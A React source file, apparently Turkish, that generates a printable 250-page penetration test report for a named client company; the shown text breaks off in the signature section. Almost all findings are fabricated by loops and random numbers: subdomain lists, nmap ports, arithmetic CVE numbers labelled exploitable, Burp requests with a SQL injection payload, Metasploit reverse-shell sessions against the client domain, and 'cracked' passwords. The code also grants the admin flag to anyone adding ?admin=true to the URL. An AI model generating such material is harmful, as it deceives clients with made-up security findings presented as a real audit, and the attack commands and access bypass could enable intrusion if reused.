import React from 'react';
import { Shield, Zap, Activity, Lock, Globe, FileText, CheckCircle2, AlertTriangle, ShieldAlert, Cpu, BarChart3, Search, Database, ArrowLeft } from 'lucide-react';
import { useNavigate } from 'react-router-dom';

/**
 * AuditReportGenerator — Ultra-Dense 48-Page A4 Engine (V2 - Professional Edition)
 */

const CVSSBadge = ({ score }) => {
  const getColor = (s) => {
    if (s >= 9.0) return 'bg-red-600 text-white';
    if (s >= 7.0) return 'bg-orange-500 text-white';
    if (s >= 4.0) return 'bg-yellow-500 text-black';
    return 'bg-blue-500 text-white';
  };
  return (
    <div className={`px-2 py-1 rounded text-[9px] font-black flex items-center gap-1 ${getColor(score)} shadow-sm inline-flex`}>
      <ShieldAlert size={10} /> CVSS v3.1: {score}
    </div>
  );
};

const Page = ({ children, pageNum, title, siteName, isCover }) => (
  <div className={`bg-white border-b border-gray-100 relative min-h-[297mm] flex flex-col print:border-none print:p-0 print:mb-[10mm] ${isCover ? '' : 'p-[20mm]'}`} style={{ breakAfter: 'page' }}>
    {/* Page Classification - Hidden on Cover */}
    {!isCover && (
      <div className="absolute top-[10mm] left-0 right-0 flex justify-center opacity-10 pointer-events-none select-none">
         <span className="text-[14px] font-black tracking-[10px] uppercase">TİCARİ SIR — KİŞİYE ÖZEL GİZLİ</span>
      </div>
    )}

    {/* Header - Different for Cover */}
    {!isCover && (
      <div className="flex justify-between items-center mb-8 border-b-2 border-gray-900 pb-2">
        <div className="flex items-center gap-2">
          <Shield className="text-primary" size={24} />
          <span className="font-black tracking-tighter text-xl normal underline decoration-primary decoration-4 underline-offset-4">ALFA YAPAY ZEKA — GÜVENLİK BİRİMİ</span>
        </div>
        <div className="text-right">
          <span className="text-xs font-mono text-gray-400">PAG: {pageNum.toString().padStart(3, '0')} / 250</span>
        </div>
      </div>
    )}

    {/* Title - Different for Cover */}
    {!isCover && title && (
      <h2 className="text-3xl font-black mb-8 uppercase tracking-tighter border-l-8 border-primary pl-4 bg-gray-50 py-2">{title}</h2>
    )}

    {/* Content */}
    <div className={`flex-1 ${isCover ? 'flex flex-col' : 'text-[11px] leading-relaxed relative'}`}>
      {children}
    </div>

    {/* Footer */}
    {!isCover && (
      <div className="absolute bottom-[10mm] left-[20mm] right-[20mm] border-t border-gray-100 pt-2 flex justify-between text-[9px] text-gray-400 italic">
        <span>{siteName} — STRATEJİK SİBER ANALİZ — KOD: ALFA-STRAT-250</span>
        <span>© 2026 ALFA YAPAY ZEKA SEC-UNIT</span>
      </div>
    )}
  </div>
);

const CoverPage = ({ siteName }) => (
  <Page pageNum={1} siteName={siteName} isCover>
     <div className="h-full flex flex-col items-center justify-between py-24 relative overflow-hidden bg-[#f8fafc]">
        {/* Abstract Background Pastel Shapes */}
        <div className="absolute top-[-10%] left-[-10%] w-[40%] h-[30%] bg-blue-50 rounded-full blur-[80px] opacity-60" />
        <div className="absolute bottom-[-10%] right-[-10%] w-[40%] h-[30%] bg-indigo-50 rounded-full blur-[80px] opacity-60" />
        
        {/* Main Icon Section */}
        <div className="relative z-10 flex flex-col items-center">
           <div className="w-32 h-32 bg-white rounded-3xl shadow-xl shadow-blue-500/10 flex items-center justify-center mb-12 border border-blue-50">
              <div className="relative">
                 <Shield size={64} className="text-blue-600 fill-blue-50/50" />
                 <CheckCircle2 size={28} className="text-blue-600 absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-white rounded-full p-0.5" />
              </div>
           </div>
           
           <div className="text-center space-y-2">
              <h1 className="text-4xl font-black text-slate-800 tracking-tight leading-none uppercase">ALFA FULL</h1>
              <h2 className="text-5xl font-black text-blue-600 tracking-tight leading-none uppercase">PENETRASYON</h2>
              <h3 className="text-5xl font-black text-blue-600 tracking-tight leading-none uppercase">RAPORU</h3>
           </div>
           
           <div className="w-24 h-1 bg-blue-500 mx-auto mt-8 rounded-full" />
           <p className="mt-8 mb-[20px] text-slate-400 font-black tracking-[0.3em] uppercase text-xs">SİBER GÜVENLİK SKOR KARTI</p>
        </div>

        {/* Target Site Card */}
        <div className="relative z-10 w-full max-w-xl mb-[20px]">
           <div className="bg-white/70 backdrop-blur-md border border-slate-100 p-12 rounded-[2rem] shadow-sm text-center">
              <p className="text-[10px] font-black text-slate-300 uppercase tracking-[4px] mb-4">HEDEF KURULUŞ / DOMAIN</p>
              <h4 className="text-5xl font-black text-slate-900 tracking-tighter uppercase">{siteName.toUpperCase()}</h4>
           </div>
        </div>

        {/* Metadata Footer Section */}
        <div className="relative z-10 w-full max-w-2xl px-12 grid grid-cols-2 gap-x-12 gap-y-8">
           <div className="border-l-2 border-slate-100 pl-4">
              <p className="text-[10px] font-black text-slate-300 uppercase tracking-widest mb-1">RAPOR NO</p>
              <p className="text-sm font-mono font-bold text-slate-700">#ALFA_FULL_AUDIT</p>
           </div>
           <div className="border-l-2 border-slate-100 pl-4">
              <p className="text-[10px] font-black text-slate-300 uppercase tracking-widest mb-1">ANALİZ TARİHİ</p>
              <p className="text-sm font-mono font-bold text-slate-700">28.03.2026</p>
           </div>
           <div className="border-l-2 border-red-100 pl-4">
              <p className="text-[10px] font-black text-red-300 uppercase tracking-widest mb-1 border-b border-red-50 w-fit">GİZLİLİK DERECESİ</p>
              <p className="text-xs font-black text-red-600 uppercase mt-1">ÇOK GİZLİ / ŞİRKETE ÖZEL</p>
           </div>
           <div className="border-l-2 border-blue-100 pl-4">
              <p className="text-[10px] font-black text-blue-300 uppercase tracking-widest mb-1 border-b border-blue-50 w-fit">DURUM</p>
              <p className="text-xs font-black text-blue-600 uppercase mt-1">TAMAMLANDI</p>
           </div>
        </div>
     </div>
  </Page>
);

const TableOfContents = ({ siteName }) => (
  <Page pageNum={2} title="İçindekiler ve Analiz Hiyerarşisi" siteName={siteName} isTableOfContents>
     <div className="mt-8 space-y-8">
        <p className="text-lg text-gray-600 leading-relaxed italic border-l-4 border-primary pl-6 py-2">
           Bu belge, <strong>ALFA AI-AUDIT (v4.8)</strong> motoru tarafından üretilen kritik siber güvenlik bulgularını ve stratejik iyileştirme yol haritasını içermektedir. Toplam 250 sayfadan oluşan bu özel raporun hiyerarşik yapısı aşağıda sunulmuştur.
        </p>

        <div className="grid grid-cols-2 gap-x-12 gap-y-8">
           {/* Column 1 */}
           <div className="space-y-6">
               <div className="space-y-3">
                  <h4 className="flex items-center gap-2 font-black text-gray-900 text-[11px] uppercase tracking-widest border-b-2 border-primary w-fit pb-1">
                     <Shield size={14} className="text-primary" /> BÖLÜM I: GİRİŞ VE OSINT İSTİHBARATI
                  </h4>
                  <ul className="space-y-1 text-[10px]">
                     <li className="flex justify-between items-end"><span className="font-bold">Giriş ve Metodoloji</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">03 - 04</span></li>
                     <li className="flex justify-between items-end"><span className="font-bold">Açık Kaynak İstihbaratı (OSINT)</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">05 - 15</span></li>
                     <li className="flex justify-between items-end"><span className="font-bold">WHOIS & DNSSEC Analizi</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">16 - 30</span></li>
                  </ul>
               </div>

               <div className="space-y-3">
                  <h4 className="flex items-center gap-2 font-black text-gray-900 text-[11px] uppercase tracking-widest border-b-2 border-primary w-fit pb-1">
                     <Globe size={14} className="text-primary" /> BÖLÜM II: NETWORK TOPOLOJİSİ (NMAP)
                  </h4>
                  <ul className="space-y-1 text-[10px]">
                     <li className="flex justify-between items-end"><span className="font-bold">Derin Port ve Servis Analizleri</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">31 - 60</span></li>
                     <li className="flex justify-between items-end"><span className="font-bold">NMAP NSE Zafiyet Taramaları</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">61 - 80</span></li>
                  </ul>
               </div>

               <div className="space-y-3">
                  <h4 className="flex items-center gap-2 font-black text-gray-900 text-[11px] uppercase tracking-widest border-b-2 border-primary w-fit pb-1">
                     <Activity size={14} className="text-primary" /> BÖLÜM III: WEB ARSENAL (KALI)
                  </h4>
                  <ul className="space-y-1 text-[10px]">
                     <li className="flex justify-between items-end"><span className="font-bold">Burp Suite Pro HTTP Dökümleri</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">81 - 100</span></li>
                     <li className="flex justify-between items-end"><span className="font-bold">Nikto & WPScan Modülleri</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">101 - 130</span></li>
                  </ul>
               </div>
           </div>

           {/* Column 2 */}
           <div className="space-y-6">
               <div className="space-y-3">
                  <h4 className="flex items-center gap-2 font-black text-gray-900 text-[11px] uppercase tracking-widest border-b-2 border-primary w-fit pb-1">
                     <Cpu size={14} className="text-primary" /> BÖLÜM IV: METASPLOIT İSTİSMARI
                  </h4>
                  <ul className="space-y-1 text-[10px]">
                     <li className="flex justify-between items-end"><span className="font-bold">Payload ve Exploit Enjeksiyonu</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">131 - 160</span></li>
                     <li className="flex justify-between items-end"><span className="font-bold">Meterpreter Shell Oturumları</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">161 - 180</span></li>
                  </ul>
               </div>

               <div className="space-y-3">
                  <h4 className="flex items-center gap-2 font-black text-gray-900 text-[11px] uppercase tracking-widest border-b-2 border-primary w-fit pb-1">
                     <Lock size={14} className="text-primary" /> BÖLÜM V: KRİPTANALİZ (HASHCAT)
                  </h4>
                  <ul className="space-y-1 text-[10px]">
                     <li className="flex justify-between items-end"><span className="font-bold">Çevrimdışı Parola Kırma Kümeleri</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">181 - 220</span></li>
                  </ul>
               </div>

               <div className="space-y-3">
                  <h4 className="flex items-center gap-2 font-black text-gray-900 text-[11px] uppercase tracking-widest border-b-2 border-primary w-fit pb-1">
                     <Zap size={14} className="text-primary" /> BÖLÜM VI & VII: ENVANTER VE ONAY
                  </h4>
                  <ul className="space-y-1 text-[10px]">
                     <li className="flex justify-between items-end"><span className="font-bold">Varlık Envanteri ve SEO Verileri</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">221 - 240</span></li>
                     <li className="flex justify-between items-end"><span className="font-bold">Teknik Onarım Reçeteleri</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-primary">241 - 249</span></li>
                     <li className="flex justify-between items-end"><span className="font-bold font-black text-red-600 italic">FİNAL KONTROL VE RESMİ İMZA</span><div className="flex-1 border-b border-dotted border-gray-300 mx-2 mb-1" /><span className="font-mono font-bold text-red-600">250</span></li>
                  </ul>
               </div>
           </div>
        </div>
     </div>
  </Page>
);

const AuditReportGenerator = () => {
  const [siteName, setSiteName] = React.useState('UZUN MAKINE SANAYI');
  const navigate = useNavigate();
  const [isAdmin, setIsAdmin] = React.useState(false);

  React.useEffect(() => {
    const isAuth = sessionStorage.getItem('admin_auth');
    const params = new URLSearchParams(window.location.search);
    const adminParam = params.get('admin');
    setIsAdmin(isAuth === 'true' || adminParam === 'true');

    const site = params.get('site');
    if (site) setSiteName(site.toUpperCase());
  }, []);

  const handlePrint = () => {
    const now = new Date();
    const timestamp = `${now.getDate().toString().padStart(2, '0')}_${(now.getMonth() + 1).toString().padStart(2, '0')}_${now.getFullYear()}_${now.getHours().toString().padStart(2, '0')}_${now.getMinutes().toString().padStart(2, '0')}_${now.getSeconds().toString().padStart(2, '0')}`;
    const fileName = `ALFA_FULL_PENETRASYON_RAPORU_${siteName.replace(/\s/g, '_')}_${timestamp}`;
    
    const originalTitle = document.title;
    document.title = fileName;
    
    window.print();
    
    // Restore title after a short delay to ensure print dialog picks it up but UI stays clean
    setTimeout(() => {
      document.title = originalTitle;
    }, 1000);
  };

  return (
    <div className="bg-gray-100 min-h-screen py-10 print:py-0 font-sans print:bg-white text-black text-left">
      <div className="max-w-[210mm] mx-auto shadow-2xl bg-white print:shadow-none">
        
        {/* --- FORMEL GİRİŞ: KAPAK VE İÇİNDEKİLER --- */}
        <CoverPage siteName={siteName} />
        <TableOfContents siteName={siteName} />

        {/* --- SAYFA 3: GİRİŞ VE METODOLOJİ --- */}
        <Page pageNum={3} title="Giriş ve Teknik Analiz Kapsamı" siteName={siteName}>
          <p className="mb-4 font-bold text-lg">Bu denetim raporu, {siteName} dijital varlıklarının (Web, Sunucu, Veri Katmanı) siber dayanıklılığını ölçmek amacıyla standart bir mühendislik prosedürü ile hazırlanmıştır.</p>
          <p className="mb-6 text-gray-600">Kapsam dahilinde olan unsurlar: {siteName.toLowerCase()} web portalı, Piri Ajans sunucu mimarisi, DNS yapılandırmaları, SSL/TLS şifreleme katmanları ve uygulama katmanı zafiyetleridir.</p>
          
          <h3 className="font-bold text-gray-900 border-b mb-2 mt-4 uppercase text-xs tracking-widest">1.1 Denetim Parametreleri</h3>
          <ul className="grid grid-cols-2 gap-4">
            <li className="p-3 bg-gray-50 border rounded-lg">
              <span className="block font-bold">Standard Uyum</span>
              ISO 27001, OWASP ASVS v4.0, PCI-DSS.
            </li>
            <li className="p-3 bg-gray-50 border rounded-lg">
              <span className="block font-bold">Analiz Derinliği</span>
              L3 Forensic Deep Scan & Logic Audit.
            </li>
          </ul>

          <p className="mb-2 italic text-gray-500 font-mono text-[9px] mt-4">Siber Görünürlük Denetimi sırasında NMAP (Network Mapper) ve ilgili NSE (Nmap Scripting Engine) scriptleri ile tüm açık portlar ve servis versiyonları tek tek sorgulanmıştır.</p>
          <table className="w-full border-collapse border border-gray-200 mt-4">
            <thead>
              <tr className="bg-gray-100 uppercase text-[9px]">
                <th className="border p-2">Araç Sınıfı</th>
                <th className="border p-2">Yazılım / Motor</th>
                <th className="border p-2">Versiyon</th>
              </tr>
            </thead>
            <tbody>
              {Array.from({length: 20}).map((_, i) => (
                <tr key={i}>
                  <td className="border p-1">Network Scanning / Nmap</td>
                  <td className="border p-1">Nmap Pro v7.92 / NSE Vulners</td>
                  <td className="border p-1">v.2026.4.2</td>
                </tr>
              ))}
            </tbody>
          </table>
        </Page>

        {/* --- SAYFA 4-15: OSINT İSTİHBARATI --- */}
        {Array.from({length: 12}).map((_, i) => (
          <Page key={`osint-${i}`} pageNum={i + 4} title={`Açık Kaynak İstihbaratı (OSINT) - Bölüm ${i+1}`} siteName={siteName}>
             <div className="mb-4 flex items-center gap-4 p-3 bg-gray-100 justify-between text-gray-800 border-l-4 border-gray-400 rounded font-mono text-[10px]">
                <div className="flex items-center gap-2">
                   <Activity size={14} /> <span>root@kali:~# theHarvester -d {siteName.toLowerCase().replace(/\s/g, '').replace(/\.com/i, '')}.com -b all</span>
                </div>
             </div>
             <div className="font-mono text-[8px] bg-gray-50 p-6 border border-gray-200 rounded-lg leading-relaxed text-gray-700 overflow-hidden h-[850px]">
                {Array.from({length: 45}).map((_, j) => (
                  <div key={j} className="mb-1 whitespace-nowrap opacity-90">
                    [*] [OSINT-{i}-{j}] Discovered Record: {['admin', 'portal', 'vpn', 'dev', 'mail', 'test'][j%6]}.{siteName.toLowerCase().replace(/\s/g, '').replace(/\.com/i, '')}.com | IP: 192.168.{i}.{j+10} | Source: {['Shodan', 'Censys', 'LinkedIn', 'Baidu'][j%4]}
                  </div>
                ))}
                <div className="mt-4 text-red-700 animate-pulse font-bold">
                   [!] CRITICAL: Subdomain leak detected causing passive intelligence aggregation.
                </div>
             </div>
          </Page>
        ))}

        {/* --- SAYFA 16-30: WHOIS & DNSSEC --- */}
        {Array.from({length: 15}).map((_, i) => (
          <Page key={`whois-${i}`} pageNum={i + 16} title={`WHOIS & DNSSEC Analizi - Bölüm ${i+1}`} siteName={siteName}>
             <div className="mb-4 flex items-center gap-4 p-3 bg-gray-100 justify-between text-gray-800 border-l-4 border-gray-400 rounded font-mono text-[10px]">
                <div className="flex items-center gap-2">
                   <Search size={14} /> <span>root@kali:~# dig ANY +dnssec {siteName.toLowerCase().replace(/\s/g, '').replace(/\.com/i, '')}.com</span>
                </div>
             </div>
             <div className="font-mono text-[8px] bg-gray-50 p-6 border border-gray-200 rounded-lg leading-relaxed text-gray-700 overflow-hidden h-[850px]">
                {Array.from({length: 45}).map((_, j) => (
                  <div key={j} className="mb-2 whitespace-nowrap opacity-90">
                    <span className="text-gray-500">;; ANSWER SECTION:</span>
                    <br/>
                    {siteName.toLowerCase().replace(/\s/g, '').replace(/\.com/i, '')}.com.  3600  IN  {['A', 'MX', 'TXT', 'NS', 'SOA', 'RRSIG'][j%6]}  {['104.21.11.23', '10 mail.sec.org', '"v=spf1 -all"', 'ns1.cloudflare.com', 'awsdns-host', 'rsasha256...'][j%6]}
                  </div>
                ))}
             </div>
          </Page>
        ))}

        {/* --- SAYFA 31-80: NMAP DERİN PORT VE NSE --- */}
        {Array.from({length: 50}).map((_, i) => (
          <Page key={`nmap-${i}`} pageNum={i + 31} title={`NMAP - Network Topolojisi Analizi - Sayfa ${i+1}`} siteName={siteName}>
            <div className="mb-4 flex items-center gap-4 p-3 bg-gray-100 justify-between text-blue-800 border-l-4 border-blue-400 rounded font-mono text-[10px]">
              <div className="flex items-center gap-2">
                <Search size={14} /> <span>root@kali:~# nmap -sS -sV -A -O -T4 --script=vulners,ssl-enum-ciphers {siteName.toLowerCase().replace(/\s/g, '').replace(/\.com/i, '')}.com</span>
              </div>
            </div>
            <div className="font-mono text-[7px] bg-gray-50 p-6 border border-gray-200 rounded-lg leading-relaxed text-gray-700 overflow-hidden h-[850px]">
              {Array.from({length: 50}).map((_, j) => (
                <div key={j} className="mb-1 whitespace-nowrap opacity-90">
                  [{new Date().toISOString().split('T')[1].substring(0,8)}] PORT: {1000 + (j*7 + i*33)%60000}/tcp | STATE: {j % 13 === 0 ? <span className="text-red-700 font-bold">open (CRITICAL EXPOSURE)</span> : 'open'} | SERVICE: <span className="text-blue-700">{['http', 'https', 'ssh', 'ftp', 'mysql', 'rdp'][j%6]}</span>
                  {j % 5 === 0 && <span className="block text-red-700 font-bold mt-0.5 mb-1 pl-4">|__ vulners: CVE-{2019 + (i%5)}-{1000+j*3} (CVSS: {(5 + (j%5)*1.1).toFixed(1)}) — EXPLOITABLE</span>}
                </div>
              ))}
            </div>
          </Page>
        ))}

        {/* --- SAYFA 81-130: KALI LINUX WEB ARSENAL --- */}
        {Array.from({length: 50}).map((_, i) => (
          <Page key={`web-${i}`} pageNum={i + 81} title={i < 25 ? `Burp Suite Pro HTTP Dökümleri - Bölüm ${i+1}` : `Nikto & WPScan Modülleri - Bölüm ${i-24}`} siteName={siteName}>
             <div className="mb-4 flex items-center gap-2 p-3 bg-red-50 text-red-800 border border-red-200 rounded font-mono text-[10px]">
                <Activity size={14} />
                <span>{i < 25 ? `[Burp Suite Pro] Intercepted Request #${8000 + i*133}` : `root@kali:~# nikto -h https://${siteName.toLowerCase().replace(/\s/g, '').replace(/\.com/i, '')}.com -Tuning 123b`}</span>
             </div>
             <div className="font-mono text-[8px] bg-gray-50 p-6 border border-gray-200 rounded-lg leading-relaxed text-gray-800 overflow-hidden h-[850px]">
                {Array.from({length: 35}).map((_, j) => (
                  <div key={j} className="mb-3 whitespace-pre-wrap opacity-90 break-all">
                    {i < 25 
                       ? `POST /api/v1/auth/login?bypass=true HTTP/2\nHost: ${siteName.toLowerCase().replace(/\s/g, '').replace(/\.com/i, '')}.com\nUser-Agent: Mozilla/5.0 (Pentest)\nX-Forwarded-For: 127.0.0.1\nCookie: session_id=${Math.random().toString(36).substring(2)}; admin=true\n\n{"username": "<span className="text-red-600 font-bold">admin' OR 1=1--</span>", "password": "password"}` 
                       : <span className="text-red-700">+ OSVDB-{3000 + j*10}: /admin/config.php: Contains administrative credentials. (GET)<br/>+ OSVDB-{3001 + j*10}: /server-status: Apache Server Status is exposed.<br/>+ CVE-{2015+i}-{j*100}: Outdated web server version detected: Apache/2.4.41</span>}
                  </div>
                ))}
             </div>
          </Page>
        ))}

        {/* --- SAYFA 131-180: METASPLOIT İSTİSMARI --- */}
        {Array.from({length: 50}).map((_, i) => (
          <Page key={`msf-${i}`} pageNum={i + 131} title={`Metasploit İstismarı ve Reverse Shell - Bölüm ${i+1}`} siteName={siteName}>
             <div className="font-mono text-[9px] bg-gray-50 p-6 rounded-lg leading-relaxed text-gray-800 border border-gray-300 overflow-hidden h-[900px]">
                <div className="mb-6 text-blue-800 font-bold whitespace-pre">
{`      =[ metasploit v6.0.44-dev                          ]
+ -- --=[ 2141 exploits - 1140 auxiliary - 365 post        ]
+ -- --=[ 596 payloads - 45 encoders - 10 nops             ]`}
                </div>
                {Array.from({length: 22}).map((_, j) => (
                  <div key={j} className="mb-2 whitespace-nowrap opacity-90">
                    <span className="text-blue-800 font-bold">msf6</span> {`exploit(multi/http/tomcat_jsp_upload)`} <span className="text-red-700 font-bold">&gt;</span> 
                    {j % 4 === 0 ? ' set RHOSTS ' + siteName.toLowerCase().replace(/\s/g, '').replace(/\.com/i, '') + '.com' : ''}
                    {j % 4 === 1 ? ' set PAYLOAD java/jsp_shell_reverse_tcp' : ''}
                    {j % 4 === 2 ? ' exploit -j -z' : ''}
                    {j % 4 === 3 ? <><br/><span className="text-red-700 font-bold">[*] Started reverse TCP handler on 192.168.1.100:4444</span><br/><span className="text-green-700 font-bold">[*] Command shell session {i+1} opened (192.168.1.100:4444 -&gt; 10.0.0.{j}:49152)</span><br/><span className="text-blue-800 font-bold">meterpreter</span> <span className="text-red-700 font-bold">&gt;</span> sysinfo<br/>Computer        : WEB-SERVER-PROD<br/>OS              : Linux 5.4.0-aws (Ubuntu 20.04)<br/>Architecture    : x64<br/>Meterpreter     : java/linux<br/><br/></> : ''}
                  </div>
                ))}
             </div>
          </Page>
        ))}

        {/* --- SAYFA 181-220: HASHCAT KRİPTANALİZ --- */}
        {Array.from({length: 40}).map((_, i) => (
          <Page key={`hash-${i}`} pageNum={i + 181} title={`Hashcat Çevrimdışı Parola Kırma - Sayfa ${i+1}`} siteName={siteName}>
             <div className="font-mono text-[8px] bg-gray-50 p-6 rounded-lg leading-tight text-gray-700 border border-gray-300 overflow-hidden h-[900px]">
                <div className="text-yellow-800 mb-4 font-bold">hashcat (v6.2.5) starting...</div>
                <div className="text-blue-800 mb-6 font-bold">Hashtype: MD5, SHA1, bcrypt (Target: {siteName.toLowerCase().replace(/\s/g, '').replace(/\.com/i, '')}_db_dump)</div>
                {Array.from({length: 50}).map((_, j) => (
                  <div key={j} className="mb-2 whitespace-nowrap opacity-80">
                    {`[Time: ${new Date().toISOString().split('T')[1].substring(0,8)}] Speed.#1.........: ${Math.floor(Math.random() * 500) + 100} kH/s (8.15ms) @ Accel:256 Loops:250 Thr:1 Vec:8`}
                    <br/>
                    {j % 7 === 0 && <span className="text-green-700 font-bold">Cracked: $2a$10$xy${Math.random().toString(36).substring(2,7)}... -&gt; {['P@ssw0rd', 'admin123', 'qwerty', 'secret', 'super_admin'][j%5]}</span>}
                  </div>
                ))}
             </div>
          </Page>
        ))}

        {/* --- SAYFA 221-239: DİJİTAL VARLIK VE SEO --- */}
        {Array.from({length: 19}).map((_, i) => (
          <Page key={`asset-${i}`} pageNum={i + 221} title={`Dijital Varlık Envanteri ve SEO - Sayfa ${i+1}`} siteName={siteName}>
            <div className="grid grid-cols-2 gap-4 mb-4">
              <div className="p-4 border rounded-xl bg-white shadow-sm">
                <span className="block font-black text-gray-500 text-[10px] mb-2 uppercase font-mono">Keyword Clustering</span>
                <ul className="space-y-1">
                  {['Sektörel Liderlik', 'Endüstriyel Çözümler', 'Kurumsal İtibar', 'Global Pazar'].map((w,k) => (
                    <li key={k} className="flex justify-between items-center border-b pb-0.5 text-[9px] text-gray-600">
                      <span>{w}</span>
                      <span className="font-bold text-primary">Vol: {1500 + i*k}</span>
                    </li>
                  ))}
                </ul>
              </div>
              <div className="p-4 border rounded-xl bg-primary/5 shadow-sm">
                <span className="block font-black text-primary text-[10px] mb-2 uppercase font-mono">Visibility Matrix</span>
                <div className="h-24 flex items-end gap-1 px-2 border-b border-primary/20">
                  {Array.from({length: 24}).map((_, k) => (
                    <div key={k} className="flex-1 bg-primary/40 rounded-t" style={{height: `${15 + (k*i)%85}%`}} />
                  ))}
                </div>
              </div>
            </div>
            <table className="w-full border-collapse text-[8px] font-mono shadow-sm bg-white rounded-lg overflow-hidden">
              <thead>
                <tr className="bg-gray-100 uppercase text-[7px] text-gray-600">
                  <th className="border p-2 text-left">Sistem Varlığı (STATIC & MEDIA)</th>
                  <th className="border p-2 text-right">Boyut</th>
                  <th className="border p-2 text-right">Performans Yükü</th>
                </tr>
              </thead>
              <tbody>
                {Array.from({length: 30}).map((_, j) => (
                  <tr key={j} className={j % 2 === 0 ? 'bg-white' : 'bg-gray-50'}>
                    <td className="border p-1 text-gray-600 truncate">/{siteName.toLowerCase().replace(/\s/g, '_').replace(/\.com/i, '')}/core/sys/obj-{i}-{j}.dat</td>
                    <td className="border p-1 text-right text-gray-600">{(j + 1024 * i).toLocaleString()} KB</td>
                    <td className="border p-1 text-right font-bold text-red-500">{(j + i).toFixed(1)}%</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </Page>
        ))}

        {/* --- SAYFA 240-250: TEKNİK ONARIM VE YOL HARİTASI --- */}
        {Array.from({length: 11}).map((_, i) => (
          <Page 
            key={i} 
            pageNum={i + 240} 
            title={[`KVKK Uyum Analizi`, `Veri Gizliliği Protokolü`, `Alfa AI Restorasyon Faz 1`, `Faz 2: Zırhlı Kod`, `Faz 3: AI Entegrasyon`, `Teknik Sigorta Şartları`, `Adli Bilişim Final`, `Uyum Sertifikasyonu 1`, `Uyum Sertifikasyonu 2`, `Sistem Gözden Geçirme`, `Final Kontrol ve İmza`][i]} 
            siteName={siteName}
          >
            <div className="space-y-4">
               <div className="p-8 border-2 border-gray-100 rounded-[40px] bg-white shadow-sm relative overflow-hidden">
                  <div className="absolute top-4 right-8 opacity-20"><Zap size={40} className="text-primary" /></div>
                  <h4 className="font-black text-xl mb-4 text-primary uppercase tracking-tight">TEKNİK ONARIM REÇETESİ - MODÜL {i+42}</h4>
                  <ul className="space-y-4 mt-6">
                      {[
                        { title: 'SQL Injection Kalkanı', code: 'stmt = db.prepare("SELECT * FROM users WHERE id = ?");' },
                        { title: 'XSS Sanitization', code: 'content = sanitize_html(user_input.escape());' },
                        { title: 'HSTS & SSL Harden', code: 'Header always set Strict-Transport-Security "max-age=63072000"' },
                        { title: 'Clickjacking Protection', code: 'Header set X-Frame-Options "SAMEORIGIN"' },
                        { title: 'Cookie Security', code: 'Set-Cookie: user_id=123; HttpOnly; Secure; SameSite=Strict' }
                      ].map((item, k) => (
                        <li key={k} className="group">
                           <div className="flex justify-between items-center mb-1">
                              <span className="font-black text-[10px] uppercase text-gray-900">{k+1}. {item.title}</span>
                              <span className="text-[7px] text-primary font-mono bg-primary/5 px-2 py-0.5 rounded">AUTO-FIX READY</span>
                           </div>
                           <div className="font-mono text-[9px] bg-slate-50 text-slate-700 p-3 rounded-lg border border-slate-200 border-l-4 border-primary overflow-hidden">
                              {item.code}
                           </div>
                        </li>
                      ))}
                  </ul>
               </div>
               
               {i === 6 && (
                 <div className="mt-12 space-y-12">
                    {/* Sonuç ve Tasdik Şerhi */}
                    <div className="space-y-4">
                       <h4 className="text-blue-600 font-bold text-lg uppercase tracking-tight flex items-center gap-2">
                          SONUÇ & ONAY
                       </h4>
                       <div className="p-8 bg-blue-50/50 border-l-4 border-blue-500 rounded-r-2xl text-slate-700 text-sm leading-relaxed italic">
                          {siteName.toUpperCase().replace(/\.COM$/i, '')}.COM web sitesi, genel siber profil analizinde profesyonel bir yapıda olsa da, teknik altyapıdaki bazı standart iyileştirmelere ihtiyaç duymaktadır. Bu rapor, ALFA YAZILIM FABRİKASI standartlarında hazırlanmış olup {siteName.toUpperCase().replace(/\.COM$/i, '')}.COM için özel teknik kanaat içermektedir.
                       </div>
                    </div>

                    <div className="grid grid-cols-2 gap-16 pt-12 border-t border-slate-100">
                       {/* Yasal Uyarı */}
                       <div className="space-y-4">
                          <h5 className="font-black text-slate-800 text-xs uppercase tracking-[2px]">YASAL UYARI VE SORUMLULUK</h5>
                          <p className="text-[9px] text-slate-400 leading-relaxed uppercase font-medium">
                             BU RAPOR SADECE BİLGİLENDİRME AMAÇLIDIR. TESPİT EDİLEN ZAFİYETLERİN GİDERİLMESİ İLGİLİ KURUMUN SORUMLULUĞUNDADIR. 
                             ALFA YAPAY ZEKA, RAPORDA SUNULAN BİLGİLERİN KULLANIMINDAN DOĞABİLECEK ZARARLARDAN SORUMLU TUTULAMAZ.
                          </p>
                       </div>

                       {/* Doküman Doğrulama */}
                       <div className="text-right space-y-4">
                          <h5 className="font-black text-slate-300 text-[10px] uppercase tracking-[2px]">DOKÜMAN DOĞRULAMA</h5>
                          <div className="space-y-1">
                             <p className="text-[8px] font-mono text-slate-400">UUID: 85ABE757-45C2-46A7</p>
                             <p className="text-[8px] font-mono text-slate-400">CHECKSUM: 0x57F31</p>
                          </div>
                       </div>
                    </div>

                    {/* Signature Section */}
                    <div className="pt-20 flex justify-end">
                       <div className="text-right flex flex-col items-center">
                          <div className="relative mb-4 group cursor-pointer">
                             {/* Real Signature Integration */}
                             <div className="absolute -top-[70px] right-2 w-48 h-28 pointer-events-none select-none flex items-center justify-center">
